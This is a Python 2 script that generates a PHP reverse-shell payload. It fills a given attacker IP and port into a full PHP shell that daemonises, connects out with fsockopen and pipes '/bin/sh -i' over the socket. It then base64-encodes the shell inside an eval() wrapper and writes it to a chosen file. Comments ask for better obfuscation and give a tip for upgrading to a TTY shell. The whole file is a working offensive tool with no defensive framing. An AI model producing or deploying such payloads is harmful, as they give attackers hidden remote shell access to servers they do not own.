#!/usr/bin/env python
# -*- coding: utf-8 -*-

# TODO
# Find a better way to obfuscate the payload

#`TIPS:
# Upgrade to tty shell: "python -c 'import pty; pty.spawn("/bin/bash")'"

import os
import sys

if (len(sys.argv) == 4):
	ip = sys.argv[1]
	port = sys.argv[2]
	path = sys.argv[3]

	if (os.path.isdir(path)):
		print '[!] Invalid filename: ' + path + ' is a directory!'
		exit()
else:
	print '[!] Usage: %s <ip> <port> <filename>' % (sys.argv[0])
	exit()

code = """
set_time_limit (0);
$ip = 'CHANGEIP';
$port = CHANGEPORT;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();

	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}

	if ($pid) {
		exit(0);
	}

	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}
"""

try:
	print '[*] Setting ip: ' + ip
	code = code.replace ('CHANGEIP', ip)

	print '[*] Setting port: ' + port
	code = code.replace ('CHANGEPORT', port)

	with open (path, 'w') as payload:
		code = "<?php eval(base64_decode('" + code.encode('base64') + "')); ?>"
		payload.write (code)

	print '[+] Payload created successfully in ' + os.path.abspath(path)
except:
	print '[!] Error writing the payload.'
